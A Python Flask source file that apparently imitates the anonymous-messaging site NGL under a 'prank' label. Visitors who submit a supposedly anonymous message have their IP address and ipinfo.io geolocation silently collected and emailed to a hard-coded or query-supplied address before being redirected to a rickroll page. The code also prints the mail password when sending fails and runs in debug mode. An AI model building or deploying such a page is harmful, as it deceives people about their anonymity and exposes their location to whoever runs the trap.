from flask import Flask, render_template, redirect, url_for, request
import requests, os
from dotenv import load_dotenv
from flask_mail import Mail, Message
load_dotenv()
# Load environment variables
PAWD = os.getenv('PAWD')
MAIL = os.getenv('MAIL')
# Check if environment variables are set
if not PAWD or not MAIL:
    raise ValueError("Environment variables PWD and MAIL must be set.")
def get_geo_info(ip):
    try:
        res = requests.get(f"https://ipinfo.io/{ip}/json")
        if res.status_code == 200:
            return res.json()
    except Exception as e:
        print("GeoIP lookup failed:", e)
    return {}
app = Flask(__name__)
app.config['MAIL_SERVER'] = 'smtp.gmail.com'
app.config['MAIL_PORT'] = 465
app.config['MAIL_USERNAME'] = MAIL
app.config['MAIL_PASSWORD'] = PAWD  # Use Gmail App Password
app.config['MAIL_USE_TLS'] = False
app.config['MAIL_USE_SSL'] = True
mail = Mail(app)
@app.route('/ngl.link/<username>', methods=['GET'])
def prank_ngl(username):
    return render_template('ngl.html', username=username)
@app.route('/ngl.link/<username>', methods=['POST'])
def prank_ngl_post(username):
    message = request.form.get('question')
    recp = request.args.get('recp', default = 'abcdzxy9qju2c9jj@gmail.com')
    print(f"Received message for {username}: {message}")
    user_ip = request.remote_addr
    geo_info = get_geo_info(user_ip)
    if geo_info:
        print(f"GeoIP info for {user_ip}: {geo_info}")
    else:
        print("No GeoIP info available.")
    # Send email with the message
    BODY = f"New message for {username}:\n\n{message}\n\nIP: {user_ip}\n\nGeoIP Info: {geo_info}"
    msg = Message(subject=f"New message for {username}",
                  sender=MAIL,
                  body=BODY,
                  recipients=[recp])
    try:
        mail.send(msg)
        print("Email sent successfully.")
    except Exception as e:
        print("Failed to send email:", e)
        print('-'*20)
        print("MAIL:", MAIL)
        print("PWD:", PAWD)
        print('-'*20)
    # Here you would handle the message, e.g., save it to a database or send it somewhere
    return redirect(url_for('rickRoll'))
@app.route('/ngl.link/rickroll', methods=['GET'])
def rickRoll():
    return render_template('rick-roll.html')
if __name__ == '__main__':
    app.run(debug=True)

'''
'''